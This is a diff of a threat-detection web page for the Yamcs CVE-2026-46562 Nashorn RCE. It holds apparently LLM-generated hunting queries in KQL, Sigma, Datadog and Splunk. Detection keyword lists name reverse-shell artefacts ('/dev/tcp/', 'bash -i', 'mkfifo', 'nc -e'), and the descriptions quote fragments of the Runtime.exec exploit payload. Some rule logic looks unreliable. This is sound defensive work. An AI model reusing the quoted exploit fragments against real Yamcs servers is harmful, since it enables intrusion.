@@ -723,11 +723,11 @@ DeviceFileEvents
   data-phases="actions,c2,exploit,install,recon" data-sev="crit"
   data-techs="T1190"
   data-sources="GitHub Security Advisories"
-  data-platforms="cloudwatch,datadog,def,falcon,sent,sigma,spl"
-  data-splunk-cats="application,endpoint,network"
+  data-platforms="datadog,def,falcon,sent,sigma,spl"
+  data-splunk-cats="application,endpoint,web"
   data-targets="linux,vcs,windows"
   data-uc-count="5" data-llm-uc-count="3"
-  data-search="[GHSA / CRITICAL] CVE-2026-46562: Yamcs Vulnerable to Remote Code Execution via Mission Database algorithm override Yamcs Vulnerable to Remote Code Execution via Mission Database algorithm override CVE-2026-46562 T1190 [LLM] Yamcs MDB algorithm override PATCH with Nashorn Runtime.exec breakout payload [LLM] Yamcs JVM spawning shell or command interpreter (post-Nashorn-RCE) [LLM] Yamcs JVM initiating outbound TCP to non-mission-control destination (post-RCE C2) Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-46562: Yamcs Vulnerable to Remote Code Execution via">
+  data-search="[GHSA / CRITICAL] CVE-2026-46562: Yamcs Vulnerable to Remote Code Execution via Mission Database algorithm override Yamcs Vulnerable to Remote Code Execution via Mission Database algorithm override CVE-2026-46562 T1190 [LLM] Yamcs MdbOverrideApi algorithm PATCH carrying Nashorn Java.type RCE payload [LLM] Yamcs JVM spawning a POSIX shell — Nashorn Runtime.exec post-exploitation [LLM] Reverse-shell /dev/tcp file descriptor from Yamcs java process tree Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-46562: Yamcs Vulnerable to Remote Code Execution via">
   <div class="sev-ribbon crit">Critical</div>
   <button class="share-btn card-share" data-share-art="2026-05-27-ghsa-critical-cve-2026-46562-yamcs-vulnerable-to-remote-code" title="Copy share link to this article" aria-label="Copy share link">
     <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
@@ -787,30 +787,24 @@ DeviceFileEvents
   <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
 <div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
 <div class="phase-line "><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
-<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] Yamcs MDB algorithm override PATCH with Nashorn Runtime.exec breakout payload</em></div>
-<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] Yamcs JVM spawning shell or command interpreter (post-Nashorn-RCE) · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-46562: Yamcs Vulnerable to Remote Code Execution via</em></div>
-<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking. <em>→ [LLM] Yamcs JVM initiating outbound TCP to non-mission-control destination (post-RCE C2)</em></div>
+<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] Yamcs MdbOverrideApi algorithm PATCH carrying Nashorn Java.type RCE payload</em></div>
+<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] Yamcs JVM spawning a POSIX shell — Nashorn Runtime.exec post-exploitation · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-46562: Yamcs Vulnerable to Remote Code Execution via</em></div>
+<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking. <em>→ [LLM] Reverse-shell /dev/tcp file descriptor from Yamcs java process tree</em></div>
 <div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
 </div>
-  <div class="usecases"><details class="uc" data-uc-slug="21c2d5fc37" data-platforms="cloudwatch,datadog,def,sent,sigma,spl" data-targets="vcs,windows" open>
+  <div class="usecases"><details class="uc" data-uc-slug="e133a9b8e1" data-platforms="datadog,def,sent,sigma,spl" data-targets="vcs,windows" open>
   <summary>
-    <span class="uc-title">[LLM] Yamcs MDB algorithm override PATCH with Nashorn Runtime.exec breakout payload</span>
+    <span class="uc-title">[LLM] Yamcs MdbOverrideApi algorithm PATCH carrying Nashorn Java.type RCE payload</span>
     <span class="uc-phase">Exploitation</span>
     <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="21c2d5fc37" title="Copy share link to this UC" aria-label="Copy share link">
+    <button class="share-btn" data-share-uc="e133a9b8e1" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Detects exploitation of CVE-2026-46562 at the HTTP layer: a PATCH request to the Yamcs MDB algorithm override endpoint whose JSON body contains the Nashorn class-loading primitives the PoC uses to escape the script wrapper (e.g. `} Java.type(&quot;java.lang.Runtime&quot;)...function _x(){`). Because successful exploitation emits NO Yamcs event, the proxy/WAF tier is the only pre-execution choke point.
+    <div class="uc-desc">Detects HTTP PATCH requests to the Yamcs algorithm-override endpoint where the JSON body contains Nashorn escape sequences that reach `java.lang.Runtime` — the exact CVE-2026-46562 exploit shape. Targets the request hitting any reverse proxy / WAF / web log in front of Yamcs (default port 8090).
 
-Rationale: Pivots on the exact endpoint paths the article gives (`/api/mdb-overrides/{instance}/{processor}/algorithms/{name}` and the pre-5.5.0 `/api/mdb/...` variant) plus the Nashorn breakout strings literally in the PoC body (`Java.type`, `java.lang.Runtime`, `getRuntime()`, and the unique `function _x` wrapper-reopen trick). Corroborated against the upstream advisory and a parallel Nashorn-no-ClassFilter pattern in Apache Ranger CVE-2025-59059.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-vmwp-vh32-rj75
-  • https://advisories.gitlab.com/maven/org.yamcs/yamcs-core/CVE-2026-44632/
-  • https://www.thehackerwire.com/apache-ranger-rce-in-nashornscriptenginecreator-cve-2025-59059/
-  • https://docs.yamcs.org/yamcs-server-manual/services/global/http-server/</div>
+Rationale: Exploits ride the article&#x27;s exact endpoint shape `PATCH /api/mdb-overrides/{instance}/{processor}/algorithms/{name*}` and require Nashorn pivot tokens (`Java.type`, `java.lang.Runtime`, `getRuntime`) in the JSON body — both are dead-giveaway strings called out in the GHSA advisory body. Legacy `5.5.0` path `/api/mdb/.../algorithms/` is also covered. No external corroboration available — advisory is sole source as of 2026-05-28.</div>
     <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Command and Scripting Interpreter: JavaScript">T1059.007</span></div>
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Web.Web</span></div>
     <div class="tabs">
@@ -818,104 +812,68 @@ Cross-checked against:
       <button class="tab-btn" data-target="art-01-uc0-sentinel">Sentinel KQL</button>
       <button class="tab-btn" data-target="art-01-uc0-sigma">Sigma</button>
       <button class="tab-btn" data-target="art-01-uc0-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-01-uc0-cloudwatch">CloudWatch Logs Insights</button>
       <button class="tab-btn" data-target="art-01-uc0-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-01-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceNetworkEvents
+    <div class="tab-content active" id="art-01-uc0-kql"><pre><button class="copy-btn">COPY</button><code>// Defender Advanced Hunting has no HTTP request-body table for Yamcs front-end logs; closest pivot is inbound TCP to port 8090 followed by java spawning a shell. See UC2/UC3 for the post-exploitation half.
+DeviceNetworkEvents
 | where Timestamp &gt; ago(7d)
-| where LocalPort == 8090 or RemotePort == 8090
+| where ActionType == &quot;InboundConnectionAccepted&quot;
+| where LocalPort == 8090
 | where InitiatingProcessFileName has_any (&quot;java&quot;,&quot;java.exe&quot;)
-| join kind=inner (
-    DeviceProcessEvents
-    | where Timestamp &gt; ago(7d)
-    | where ProcessCommandLine has &quot;yamcs&quot;
-    | project DeviceId, YamcsPid = ProcessId, YamcsCmd = ProcessCommandLine
-) on DeviceId
-| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, YamcsCmd
+| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine
 | order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-01-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>let YamcsExploitPaths = dynamic([&quot;/api/mdb-overrides/&quot;,&quot;/api/mdb/&quot;]);
-union isfuzzy=true
-(
-    CommonSecurityLog
-    | where TimeGenerated &gt; ago(7d)
-    | where RequestMethod =~ &quot;PATCH&quot;
-    | where RequestURL has_any (YamcsExploitPaths) and RequestURL has &quot;/algorithms/&quot;
-    | extend Body = coalesce(tostring(DeviceCustomString1), tostring(DeviceCustomString2), tostring(AdditionalExtensions))
-    | where Body has_any (&quot;Java.type&quot;,&quot;java.lang.Runtime&quot;,&quot;getRuntime()&quot;,&quot;function _x&quot;)
-    | project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, Body, RequestClientApplication
-),
-(
-    W3CIISLog
-    | where TimeGenerated &gt; ago(7d)
-    | where csMethod =~ &quot;PATCH&quot;
-    | where (csUriStem has &quot;/api/mdb-overrides/&quot; or csUriStem has &quot;/api/mdb/&quot;) and csUriStem has &quot;/algorithms/&quot;
-    | where sPort == 8090 or sPort == 443
-    | project TimeGenerated, cIP, sPort, csMethod, csUriStem, csUriQuery, csUserAgent
-)
+    <div class="tab-content" id="art-01-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>let YamcsExploitTokens = dynamic([&quot;Java.type&quot;,&quot;java.lang.Runtime&quot;,&quot;getRuntime&quot;,&quot;ProcessBuilder&quot;,&quot;/dev/tcp/&quot;]);
+CommonSecurityLog
+| where TimeGenerated &gt; ago(7d)
+| where RequestMethod =~ &quot;PATCH&quot;
+| where RequestURL matches regex @&quot;(?i)/api/mdb-overrides/[^/]+/[^/]+/algorithms/&quot;
+| where Message has_any (YamcsExploitTokens) or RequestContext has_any (YamcsExploitTokens) or AdditionalExtensions has_any (YamcsExploitTokens)
+| project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message, DeviceVendor, DeviceProduct
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-01-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Yamcs MDB Algorithm Override Nashorn RCE Attempt (CVE-2026-46562)
-id: 8c2a4d56-1f3e-4c9a-9b5e-6a7e8b9c0d11
-description: Detects PATCH requests to the Yamcs Mission Database algorithm override endpoint carrying Nashorn class-loading primitives used by the CVE-2026-46562 PoC.
+    <div class="tab-content" id="art-01-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Yamcs CVE-2026-46562 Mission Database Algorithm Override Nashorn RCE
+id: 9d4a1bca-1c8e-4b3f-9c33-1f5b5c8e5d51
+description: PATCH to /api/mdb-overrides/{instance}/{processor}/algorithms/{name} whose body sets the algorithm text to Nashorn JavaScript that pivots into java.lang.Runtime — the exact CVE-2026-46562 PoC shape.
 references:
   - https://github.com/advisories/GHSA-vmwp-vh32-rj75
-  - https://nvd.nist.gov/vuln/detail/CVE-2026-46562
 author: SOC Detection Engineering
 date: 2026/05/28
 tags:
-  - attack.initial_access
   - attack.t1190
-  - attack.execution
   - attack.t1059.007
-  - cve.2026.46562
 logsource:
   category: webserver
 detection:
   selection_method:
     cs-method: PATCH
   selection_uri:
-    cs-uri-stem|contains:
-      - &#x27;/api/mdb-overrides/&#x27;
-      - &#x27;/api/mdb/&#x27;
+    cs-uri-stem|contains: &#x27;/api/mdb-overrides/&#x27;
     cs-uri-stem|contains: &#x27;/algorithms/&#x27;
-  selection_body:
-    c-body|contains:
+  selection_payload:
+    cs-uri-query|contains:
       - &#x27;Java.type&#x27;
       - &#x27;java.lang.Runtime&#x27;
-      - &#x27;getRuntime()&#x27;
-      - &#x27;function _x&#x27;
-  condition: selection_method and selection_uri and selection_body
-falsepositives:
-  - Internal Yamcs MDB engineers legitimately editing JavaScript algorithms (the override path is normal; the Runtime/Java.type strings are not)
+      - &#x27;getRuntime&#x27;
+      - &#x27;/dev/tcp/&#x27;
+  condition: selection_method and selection_uri and selection_payload
 level: critical</code></pre></div>
-    <div class="tab-content" id="art-01-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>(source:nginx OR source:apache OR source:aws.waf OR source:cloudflare) @http.method:PATCH @http.url_details.path:(*/api/mdb-overrides/*/algorithms/* OR */api/mdb/*/algorithms/*) (@http.request.body:*Java.type* OR @http.request.body:*java.lang.Runtime* OR @http.request.body:*getRuntime* OR @http.request.body:*&quot;function _x&quot;*)</code></pre></div>
-    <div class="tab-content" id="art-01-uc0-cloudwatch"><pre><button class="copy-btn">COPY</button><code># log group: /aws/wafv2 (only relevant if Yamcs sits behind AWS WAF / ALB with body-inspect enabled)
-fields @timestamp, httpRequest.clientIp, httpRequest.uri, httpRequest.method, httpRequest.body, action
-| filter httpRequest.method = &quot;PATCH&quot;
-      and (httpRequest.uri like /\/api\/mdb-overrides\/.*\/algorithms\// or httpRequest.uri like /\/api\/mdb\/.*\/algorithms\//)
-      and (httpRequest.body like /Java\.type/ or httpRequest.body like /java\.lang\.Runtime/ or httpRequest.body like /getRuntime/ or httpRequest.body like /function _x/)
-| sort @timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-01-uc0-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-01-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-01-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-01-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Web.url) as url values(Web.src) as src_ip values(Web.user_agent) as user_agent from datamodel=Web where Web.http_method=PATCH (Web.url=&quot;*/api/mdb-overrides/*/algorithms/*&quot; OR Web.url=&quot;*/api/mdb/*/algorithms/*&quot;) Web.dest_port=8090 by Web.dest Web.src Web.url | `drop_dm_object_name(Web)` | append [ search index=* sourcetype IN (nginx:plus:access, nginx:access, apache:access, waf:*) method=PATCH (uri_path=&quot;*/api/mdb-overrides/*/algorithms/*&quot; OR uri_path=&quot;*/api/mdb/*/algorithms/*&quot;) (request_body=&quot;*Java.type*&quot; OR request_body=&quot;*java.lang.Runtime*&quot; OR request_body=&quot;*getRuntime()*&quot; OR request_body=&quot;*function _x*&quot;) | stats count min(_time) as firstTime max(_time) as lastTime values(uri_path) as url values(request_body) as body by src dest user_agent ] | convert ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-01-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Web.url) as url values(Web.src) as src_ip values(Web.user_agent) as user_agent from datamodel=Web where Web.http_method=PATCH (Web.url=&quot;*/api/mdb-overrides/*/algorithms/*&quot; OR Web.url=&quot;*/api/mdb/*/algorithms/*&quot;) Web.dest_port=8090 by Web.dest Web.src Web.url | `drop_dm_object_name(Web)` | append [ search index=* sourcetype IN (nginx:plus:access, nginx:access, apache:access, waf:*) method=PATCH (uri_path=&quot;*/api/mdb-overrides/*/algorithms/*&quot; OR uri_path=&quot;*/api/mdb/*/algorithms/*&quot;) (request_body=&quot;*Java.type*&quot; OR request_body=&quot;*java.lang.Runtime*&quot; OR request_body=&quot;*getRuntime()*&quot; OR request_body=&quot;*function _x*&quot;) | stats count min(_time) as firstTime max(_time) as lastTime values(uri_path) as url values(request_body) as body by src dest user_agent ] | convert ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+    <div class="tab-content" id="art-01-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>@http.method:PATCH @http.url_details.path:(*/api/mdb-overrides/*/algorithms/* OR */api/mdb/*/algorithms/*) (@http.request.body:(*Java.type* OR *java.lang.Runtime* OR *getRuntime* OR *ProcessBuilder* OR *\/dev\/tcp\/*) OR @message:(*Java.type* OR *java.lang.Runtime* OR *getRuntime* OR *\/dev\/tcp\/*))</code></pre></div>
+    <div class="tab-content" id="art-01-uc0-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-01-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-01-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-01-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Web.url) as url values(Web.src) as src values(Web.dest) as dest from datamodel=Web.Web where Web.http_method=PATCH Web.url=&quot;*/api/mdb-overrides/*/algorithms/*&quot; by Web.src Web.dest Web.user | `drop_dm_object_name(Web)` | join type=inner src dest [ search index=* sourcetype=*access* method=PATCH uri_path=&quot;*/api/mdb-overrides/*/algorithms/*&quot; (&quot;Java.type&quot; OR &quot;java.lang.Runtime&quot; OR &quot;getRuntime&quot; OR &quot;ProcessBuilder&quot; OR &quot;/dev/tcp/&quot;) | stats values(uri_path) as uri_path values(http_user_agent) as ua by src dest ] | convert ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-01-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Web.url) as url values(Web.src) as src values(Web.dest) as dest from datamodel=Web.Web where Web.http_method=PATCH Web.url=&quot;*/api/mdb-overrides/*/algorithms/*&quot; by Web.src Web.dest Web.user | `drop_dm_object_name(Web)` | join type=inner src dest [ search index=* sourcetype=*access* method=PATCH uri_path=&quot;*/api/mdb-overrides/*/algorithms/*&quot; (&quot;Java.type&quot; OR &quot;java.lang.Runtime&quot; OR &quot;getRuntime&quot; OR &quot;ProcessBuilder&quot; OR &quot;/dev/tcp/&quot;) | stats values(uri_path) as uri_path values(http_user_agent) as ua by src dest ] | convert ctime(firstTime) ctime(lastTime)</code></pre></div></div>
   </div>
 </details>
-<details class="uc" data-uc-slug="769afbc226" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
+<details class="uc" data-uc-slug="20402edecb" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
   <summary>
-    <span class="uc-title">[LLM] Yamcs JVM spawning shell or command interpreter (post-Nashorn-RCE)</span>
+    <span class="uc-title">[LLM] Yamcs JVM spawning a POSIX shell — Nashorn Runtime.exec post-exploitation</span>
     <span class="uc-phase">Installation</span>
     <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="769afbc226" title="Copy share link to this UC" aria-label="Copy share link">
+    <button class="share-btn" data-share-uc="20402edecb" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Detects the execution-side artefact of CVE-2026-46562: a Java process running Yamcs spawning bash/sh/dash/zsh/cmd/powershell. Legitimate Yamcs deployments never spawn an interactive shell from the JVM; the PoC explicitly uses `Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec([&quot;bash&quot;,&quot;-c&quot;,...])`. High-fidelity even without the HTTP exploit being logged.
+    <div class="uc-desc">Detects the Yamcs `java` process (yamcs-core JVM) directly spawning `/bin/sh`, `/bin/bash`, `dash`, or `nc` — a behaviour that never occurs in legitimate Yamcs operation. This is the immediate child-process side of the CVE-2026-46562 Nashorn RCE primitive `Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(...)`.
 
-Rationale: The PoC literally executes `Runtime.getRuntime().exec([&quot;bash&quot;,&quot;-c&quot;,&quot;exec 3&lt;&gt;/dev/tcp/...&quot;])`, so the post-exploitation footprint is a java→bash parent/child relationship — a relationship that does not occur in normal Yamcs operation (the JVM hosts the algorithm engine in-process; it does not shell out). The `RevShellHint` enrichment surfaces the specific `exec 3&lt;&gt;` and `bash -c` patterns from the PoC. Sigma + cross-platform queries make this portable across Linux deployments where Yamcs typically lives.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-vmwp-vh32-rj75
-  • https://github.com/yamcs/yamcs
-  • https://docs.yamcs.org/yamcs-server-manual/processors/algorithm-manager/</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Exploitation for Client Execution">T1203</span></div>
+Rationale: Article&#x27;s PoC literally runs `Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec([&quot;bash&quot;,&quot;-c&quot;,&quot;...&quot;])`. The unique high-fidelity signal is `java` (with `yamcs`/`org.yamcs` in its cmdline so we scope to the Yamcs JVM specifically, not arbitrary Java apps) directly forking a shell — yamcs-core itself never does this in normal operation. No external corroboration available (GHSA is sole source).</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
     <div class="tabs">
       <button class="tab-btn active" data-target="art-01-uc1-kql">Defender KQL</button>
@@ -927,137 +885,142 @@ Cross-checked against:
     </div>
     <div class="tab-content active" id="art-01-uc1-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
 | where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName in~ (&quot;java&quot;,&quot;java.exe&quot;)
-| where InitiatingProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;)
-| where FileName in~ (&quot;bash&quot;,&quot;sh&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;ksh&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;,&quot;pwsh.exe&quot;)
-| extend RevShellHint = iff(ProcessCommandLine has_any (&quot;/dev/tcp/&quot;,&quot;bash -i&quot;,&quot;sh -i&quot;,&quot;exec 3&lt;&gt;&quot;,&quot;mkfifo&quot;,&quot;nc -e&quot;,&quot;ncat -e&quot;), &quot;likely-reverse-shell&quot;, &quot;&quot;)
+| where InitiatingProcessFileName =~ &quot;java&quot;
+| where InitiatingProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;,&quot;yamcs-core&quot;)
+| where FileName in~ (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;socat&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;,&quot;ruby&quot;)
 | project Timestamp, DeviceName, AccountName,
           ParentImage = InitiatingProcessFolderPath,
           ParentCmd   = InitiatingProcessCommandLine,
           ChildImage  = FolderPath,
           ChildCmd    = ProcessCommandLine,
-          RevShellHint, SHA256
+          SHA256
 | order by Timestamp desc</code></pre></div>
     <div class="tab-content" id="art-01-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
 | where TimeGenerated &gt; ago(7d)
-| where ParentProcessName has_any (&quot;java&quot;,&quot;java.exe&quot;)
-| where ParentProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;)
-| where ActingProcessName in~ (&quot;bash&quot;,&quot;sh&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;ksh&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;,&quot;pwsh.exe&quot;)
-| extend RevShellHint = iff(ActingProcessCommandLine has_any (&quot;/dev/tcp/&quot;,&quot;bash -i&quot;,&quot;sh -i&quot;,&quot;exec 3&lt;&gt;&quot;,&quot;mkfifo&quot;,&quot;nc -e&quot;,&quot;ncat -e&quot;), &quot;likely-reverse-shell&quot;, &quot;&quot;)
-| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, RevShellHint
+| where ParentProcessName endswith &quot;/java&quot; or ParentProcessName =~ &quot;java&quot;
+| where ParentProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;,&quot;yamcs-core&quot;)
+| where ActingProcessName has_any (&quot;/sh&quot;,&quot;/bash&quot;,&quot;/dash&quot;,&quot;/zsh&quot;,&quot;/nc&quot;,&quot;/ncat&quot;,&quot;/socat&quot;,&quot;/python&quot;,&quot;/python3&quot;,&quot;/perl&quot;)
+   or TargetProcessName has_any (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;socat&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;)
+| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-01-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: Yamcs JVM Spawning Shell Indicates Nashorn RCE (CVE-2026-46562)
-id: 5b1c3e44-2a87-4d11-8e6c-7f9b1d2a3e44
-description: Yamcs mission-control servers should never spawn an interactive shell from their JVM. A bash/sh/cmd child of a java process whose command line references yamcs is a strong post-exploitation signal for CVE-2026-46562 (Nashorn ScriptEngine without ClassFilter).
+    <div class="tab-content" id="art-01-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: Yamcs JVM Spawning POSIX Shell (CVE-2026-46562 Nashorn RCE)
+id: 8b1f2cd4-2e3a-4f5a-9d77-3a2e1f4c8b62
+description: Yamcs yamcs-core java process directly spawning a POSIX shell or netcat — never occurs in legitimate Yamcs operation. Indicates Runtime.exec() reached from the Nashorn ScriptEngine in MdbOverrideApi.
 references:
   - https://github.com/advisories/GHSA-vmwp-vh32-rj75
-  - https://nvd.nist.gov/vuln/detail/CVE-2026-46562
 author: SOC Detection Engineering
 date: 2026/05/28
 tags:
-  - attack.execution
-  - attack.t1059.004
   - attack.t1190
-  - cve.2026.46562
+  - attack.t1059.004
 logsource:
   category: process_creation
+  product: linux
 detection:
   selection_parent:
-    ParentImage|endswith:
-      - &#x27;/java&#x27;
-      - &#x27;\java.exe&#x27;
+    ParentImage|endswith: &#x27;/java&#x27;
     ParentCommandLine|contains:
       - &#x27;yamcs&#x27;
       - &#x27;org.yamcs&#x27;
   selection_child:
     Image|endswith:
-      - &#x27;/bash&#x27;
       - &#x27;/sh&#x27;
+      - &#x27;/bash&#x27;
       - &#x27;/dash&#x27;
       - &#x27;/zsh&#x27;
-      - &#x27;/ksh&#x27;
-      - &#x27;\cmd.exe&#x27;
-      - &#x27;\powershell.exe&#x27;
-      - &#x27;/pwsh&#x27;
-      - &#x27;\pwsh.exe&#x27;
+      - &#x27;/nc&#x27;
+      - &#x27;/ncat&#x27;
+      - &#x27;/socat&#x27;
+      - &#x27;/python&#x27;
+      - &#x27;/python3&#x27;
+      - &#x27;/perl&#x27;
   condition: selection_parent and selection_child
-falsepositives:
-  - Yamcs operational scripts that legitimately invoke a wrapper shell at JVM startup (filter on ParentCommandLine that already contains a shell at launch)
 level: high</code></pre></div>
-    <div class="tab-content" id="art-01-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE @process.parent.name:java (@process.parent.command_line:*yamcs* OR @process.parent.command_line:*org.yamcs*) @process.name:(bash OR sh OR dash OR zsh OR ksh OR cmd.exe OR powershell.exe OR pwsh)</code></pre></div>
-    <div class="tab-content" id="art-01-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2
-| ParentBaseFileName=/^java(\.exe)?$/i
-| regex(&quot;(yamcs|org\.yamcs)&quot;, field=ParentImageFileName, strict=false) OR regex(&quot;(yamcs|org\.yamcs)&quot;, field=CommandLine, strict=false)
